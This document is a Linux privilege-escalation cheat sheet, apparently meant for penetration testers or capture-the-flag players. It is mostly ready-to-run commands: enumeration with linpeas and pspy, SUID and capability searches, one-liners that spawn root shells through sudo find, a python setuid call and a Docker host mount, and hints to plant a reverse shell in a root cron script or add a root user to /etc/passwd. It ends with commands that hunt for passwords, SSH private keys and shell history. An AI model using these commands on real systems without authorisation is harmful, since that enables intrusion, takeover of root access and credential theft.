# Linux privilege escalation cheat sheet

## Automated first
```bash
./linpeas.sh | tee linpeas.out          # the one-stop tool
./lse.sh -l1                            # linux-smart-enumeration
pspy64                                   # watch cron/root processes live (no root needed)
```

## Manual checklist
```bash
id; sudo -l                              # <-- ALWAYS. GTFOBins any allowed binary.
uname -a; cat /etc/os-release            # kernel exploit? (last resort)
find / -perm -4000 -type f 2>/dev/null   # SUID binaries -> GTFOBins
find / -perm -2000 -type f 2>/dev/null   # SGID
getcap -r / 2>/dev/null                  # capabilities (cap_setuid=ep == root)
cat /etc/crontab; ls -la /etc/cron.*     # writable cron scripts?
cat /etc/passwd; ls -la /home/*          # readable home dirs, .ssh, .bash_history
ls -la /var/www /opt /srv                # app configs with db creds
mount; cat /etc/fstab                    # nosuid? nfs no_root_squash?
env; cat ~/.bashrc ~/.profile            # secrets in environment
```

## The high-hit paths
| Signal | Escalation |
|--------|-----------|
| `sudo -l` allows a binary | <https://gtfobins.github.io> → spawn root shell |
| SUID unusual binary | GTFOBins SUID section |
| `cap_setuid+ep` on python/perl | `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| Writable cron script run by root | drop a reverse shell in it |
| Password reuse | try found creds with `su -` / other services |
| NFS `no_root_squash` | mount, drop SUID binary as root |
| Writable `/etc/passwd` | add a root user with a known hash |
| Docker group membership | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| LXD group | mount host fs in a privileged container |

## GTFOBins pattern (sudo example)
```bash
sudo -l                       # e.g. (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```

## Password / key hunting
```bash
grep -rniE 'password|passwd|secret|api_key|token' /var/www /opt /home 2>/dev/null
find / -name "*.kdbx" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
cat ~/.ssh/id_rsa ~/.bash_history ~/.mysql_history 2>/dev/null
```
